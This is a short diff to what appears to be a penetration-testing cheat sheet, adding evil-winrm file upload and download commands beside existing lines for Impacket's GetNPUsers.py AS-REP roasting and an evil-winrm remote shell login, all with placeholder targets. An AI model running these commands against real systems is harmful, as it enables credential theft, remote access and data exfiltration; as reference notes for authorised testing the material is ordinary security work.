@@ -48,3 +48,8 @@ GetNPUsers.py NAME.LOCAL/ -dc-ip IP -usersfile /path/to/userslist
 ```
 ruby evil-winrm.rb -i IP -u username -p 'password' -s '/path/to/scripts/' -e '/path/to/exes/'
 ```
+Download / Upload
+```
+upload local_filename
+download remote_filename
+```
